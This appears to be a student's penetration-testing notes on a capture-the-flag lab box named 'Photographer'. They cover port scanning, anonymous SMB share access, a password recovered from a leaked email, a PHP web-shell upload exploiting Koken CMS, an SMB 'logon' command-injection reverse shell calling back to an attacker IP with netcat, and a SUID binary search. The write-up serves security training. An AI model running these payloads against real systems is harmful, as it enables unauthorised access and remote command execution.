# Photographer lab - Notes

## Target Details
```
http://192.168.119.76/
```

## Nmap Scanning 
```
Host is up (0.22s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
```

## Attacking smb client
```
https://docs.centrify.com/Content/zint-samba/ConfigurationUNIXAccess.htm


Connecting to the SMB ip address

smbclient -N -L //192.168.119.76
-L  listing the shares present
-N  accessing without password


Using smb map
smbmap -H "ipaddrr"
```

Samba shares present
```

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            PHOTOGRAPHER

```

Accessing a particular samba share
```
smbclient -N //ip/sharename
smbclient -N //192.168.119.76/sambashare
```

Files found
```
  mailsent.txt                    
  wordpress.bkp.zip       
```

Downloading files from smb
```
get filename.txt
get mailsent.txt
```


smb reverseshell
```
logon “/=`nc 192.168.49.119 4444 -e /bin/bash`"
nc -vvlp 4444
```


Contents of files found
```
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit
Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```


Credentials
```
username : daisa@photographer.com
password : babygirl
```

Exploiting koken
```
https://www.exploit-db.com/exploits/48706
echo "<?php system(\$_GET['cmd']);?>" > image.php.jpg
```

Looking for potential-flag files
```
find /home 2>/dev/null

/home
/home/daisa
/home/daisa/Downloads
/home/daisa/Pictures
/home/daisa/.profile
/home/daisa/.bash_logout
/home/daisa/.gnupg
/home/daisa/.bashrc
/home/daisa/local.txt
/home/daisa/.bash_history
/home/daisa/user.txt
/home/daisa/.Xauthority
/home/daisa/.cache
/home/daisa/Music
/home/daisa/Desktop
/home/daisa/Videos
/home/daisa/Public
/home/daisa/.local
/home/daisa/.config
/home/daisa/.dmrc
/home/daisa/.compiz
/home/daisa/examples.desktop
/home/daisa/.gconf
/home/daisa/.ICEauthority
/home/daisa/Templates
/home/daisa/Documents
/home/lost+found
/home/agi
/home/agi/Downloads
/home/agi/Pictures
/home/agi/.mozilla
/home/agi/.profile
/home/agi/.bash_logout
/home/agi/.gnupg
/home/agi/share
/home/agi/share/mailsent.txt
/home/agi/share/wordpress.bkp.zip
/home/agi/.bashrc
/home/agi/.bash_history
/home/agi/.Xauthority
/home/agi/.cache
/home/agi/Music
/home/agi/Desktop
/home/agi/Videos
/home/agi/Public
/home/agi/.local
/home/agi/.config
/home/agi/.dmrc
/home/agi/examples.desktop
/home/agi/.gconf
/home/agi/.ICEauthority
/home/agi/Templates
/home/agi/Documents

```


Interesting files 
```
/home/daisa/user.txt
This is not the flag you're looking for...

/home/daisa/local.txt
9d2b155d685819d7018c7a3d42d93e89

```

Checking for files with suid bit
```
find / -perm -u=s -type f 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su

```